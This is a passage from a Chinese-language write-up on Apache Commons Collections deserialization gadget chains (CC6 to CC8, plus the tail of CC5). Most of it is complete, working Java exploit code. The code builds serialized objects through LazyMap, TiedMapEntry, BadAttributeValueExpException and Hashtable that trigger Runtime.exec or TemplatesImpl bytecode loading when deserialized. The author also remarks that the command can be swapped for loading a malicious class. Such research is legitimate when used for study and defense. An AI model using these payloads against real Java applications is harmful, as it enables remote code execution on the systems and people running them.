            Object temp = constructor.newInstance();
            Field name = templatesimpl.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(temp,"s1mple_hack");
            Field bytecode = templatesimpl.getDeclaredField("_bytecodes");
            bytecode.setAccessible(true);
            bytecode.set(temp,new byte[][]{bt});
            HashMap hash = new HashMap();
            Map hashmap = (Map)hash;
            Class lazy = Class.forName(lazymap);
            Constructor lazycon = lazy.getDeclaredConstructor(Map.class,Transformer.class);
            lazycon.setAccessible(true);
            Transformer[] transformers = new Transformer[]{new ConstantTransformer(temp),new InvokerTransformer("newTransformer",null,null)};
            Transformer chained = new ChainedTransformer(transformers);
            Object lazyss = lazycon.newInstance(hashmap,chained);//LazyMap实力化对象；
            Map lazyMap = (Map)lazyss;
            Class bad =  javax.management.BadAttributeValueExpException.class;
            Field val = bad.getDeclaredField("val");
            val.setAccessible(true);
            BadAttributeValueExpException as = new BadAttributeValueExpException("s1mple");
            TiedMapEntry tied = new TiedMapEntry(lazyMap,"s1mple");
            val.set(as,tied);
            ObjectOutputStream exp = new ObjectOutputStream(new FileOutputStream("c.bin"));
            exp.writeObject(as);
            ObjectInputStream test = new ObjectInputStream(new FileInputStream("c.bin"));
            test.readObject();
        }
    }
不太难理解；
## CommonsCollections6
看到了5的用法，在6中也可以进行类似的用法，将最后rce的触发点换成之前Runtime下的exec方法触发；也可导致rce；没什么好说的了；限制条件也和之前的那个链一样，SecurityManager未设置的时候可以触发；
## exp如下
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import javax.management.BadAttributeValueExpException;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;
    public class CC6 {
        public static void main(String[] args) throws Exception {
            String lazymap = "org.apache.commons.collections.map.LazyMap";
            String chain = "org.apache.commons.collections.functors.ChainedTransformer";
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(java.lang.Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}}),
            };
            HashMap hash = new HashMap();
            Map hashmap = (Map)hash;
            Class lazy = Class.forName(lazymap);
            Constructor lazycno = lazy.getDeclaredConstructor(Map.class,Transformer.class);
            lazycno.setAccessible(true);
            ChainedTransformer chains = new ChainedTransformer(transformers);
            Transformer chs = (Transformer)chains;
            Object lazyMap = lazycno.newInstance(hashmap,chs);
            Map la = (Map)lazyMap;
            Class bad =  javax.management.BadAttributeValueExpException.class;
            Field val = bad.getDeclaredField("val");
            val.setAccessible(true);
            BadAttributeValueExpException as = new BadAttributeValueExpException("s1mple");
            TiedMapEntry tied = new TiedMapEntry(la,"s1mple");
            val.set(as,tied);
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("exp.bin"));
            out.writeObject(as);
            ObjectInputStream test = new ObjectInputStream(new FileInputStream("exp.bin"));
            test.readObject();
        }
    }
弹出计算器success；
## 思考
其实反观这几个链条，都是利用了ChainedTransformer下的for循环去进行调用，其中也不乏用到了InvokerTransformer下的方法；然而org.apache.commons.collections4.functors.InvokerTransformer的transform和org.apache.commons.collections.functors.InvokerTransformer是差不多一样的，我们只需要将这个变换一下就又可以多出几个链条，但是也会受相应的版本的限制；不过这些也没什么分析的意义，在这里就不分析了；点一下；
## CommonsCollections7
先来看下调用栈；
    Gadget chain:
        java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
这里看到是在HashSet下进行反序列化，然后到HashMap下进行hashCode的跳转；追溯下函数：HashMap下的hash方法；但是在HashMap下已经存在了readObject方法，所以这里也就不去挂到HashSet类下了；直接HashMap走起；
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
可以看到这里调用了key对象下的hashCode方法；在TiedMapEntry类下也存在hashCode函数，追溯一下：
    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
可以看到也调用了getValue和getKey方法；是否看到了上一个链条的影子？那其实也没有什么悬念了；
直接exp吧；不是很难理解，基本就是换了下前面的链条，后面的exec还是调用Runtime下的，其实也可转为加载恶意class去进行rce；其实也是换汤不换药；
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    import java.util.Map;
    public class CC7 {
        public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
            String lazymap = "org.apache.commons.collections.map.LazyMap";
            String chain = "org.apache.commons.collections.functors.ChainedTransformer";
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(java.lang.Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}}),
            };
            ChainedTransformer chains = new ChainedTransformer(transformers);
            HashMap hashmap = new HashMap();
            Map hash = (Map)hashmap;
            Class lazy = Class.forName(lazymap);
            Constructor lazyconstructor = lazy.getDeclaredConstructor(Map.class,Transformer.class);
            lazyconstructor.setAccessible(true);
            Object lazyMap =lazyconstructor.newInstance(hash,chains);
            Map lazys = (Map)lazyMap;
            HashMap hashmaps = new HashMap();
            TiedMapEntry  tied = new TiedMapEntry(lazys,"s1mple");
            hashmaps.put(tied,"s1mple");
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("exp.ser"));
            out.writeObject(hashmaps);
            ObjectInputStream test = new ObjectInputStream(new FileInputStream("exp.ser"));
            test.readObject();
        }
    }
## CommonsCollections8
先来看看调用栈；
    Payload method chain:
        java.util.Hashtable.readObject
        java.util.Hashtable.reconstitutionPut
        org.apache.commons.collections.map.AbstractMapDecorator.equals
        java.util.AbstractMap.equals
        org.apache.commons.collections.map.LazyMap.get
        org.apache.commons.collections.functors.ChainedTransformer.transform
        org.apache.commons.collections.functors.InvokerTransformer.transform
        java.lang.reflect.Method.invoke
        sun.reflect.DelegatingMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke0
        java.lang.Runtime.exec
不同于这个调用栈，我简单挖掘并采用一种新的方式去进行调用；直接看到hashtable类下有一个put方法，简单追溯下：
    public synchronized V put(K key, V value) {
        // Make sure the value is not null
        if (value == null) {
            throw new NullPointerException();
        }
        // Makes sure the key is not already in the hashtable.
        Entry tab[] = table;
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        @SuppressWarnings("unchecked")
        Entry entry = (Entry)tab[index];
        for(; entry != null ; entry = entry.next) {
            if ((entry.hash == hash) && entry.key.equals(key)) {
                V old = entry.value;
                entry.value = value;
                return old;
            }
        }
        addEntry(hash, key, value, index);
        return null;
    }
非常巧的是这个方法里也是调用到了hashCode方法；而且是任意类下；这里可以直接将key赋值为TiedMapEntry实例；然后去调用其下的hashCode去触发getKey和getValue方法，接着就是常规的利用链了；
## exp
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Hashtable;
    import java.util.Map;
    public class CC8 {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(java.lang.Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}}),
            };
            ChainedTransformer chains = new ChainedTransformer(transformers);
            HashMap hashmap = new HashMap();
            Map maphash = (Map)hashmap;
            String lazy = "org.apache.commons.collections.map.LazyMap";
            Class lazyclass = Class.forName(lazy);
            Constructor lazycon  =lazyclass.getDeclaredConstructor(Map.class, Transformer.class);
            lazycon.setAccessible(true);
            Object lazymap = lazycon.newInstance(maphash,chains);
            Map laz = (Map)lazymap;
            TiedMapEntry tied = new TiedMapEntry(laz,"s1mple");
            Hashtable hash = new Hashtable();
            hash.put(tied,"s1mple");
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("s1mple.exp"));
            out.writeObject(hash);
            ObjectInputStream test = new ObjectInputStream(new FileInputStream("s1mple.exp"));
            test.readObject();
        }
    }
感悟；其实某种程度上感觉CC链还是有很多雷同的地方，很多条其他的CC链，基本在前两个CC链研究好了之后都是可以秒出，因为其本质上只是换了去触发相应函数的方法，前两条还挺好，后面的CC链都挺换汤不换药的；至于挖掘新的链条，其实也不是太难，只是看是继续换汤不换药还是去找新的后半部分链条的新触发方式了；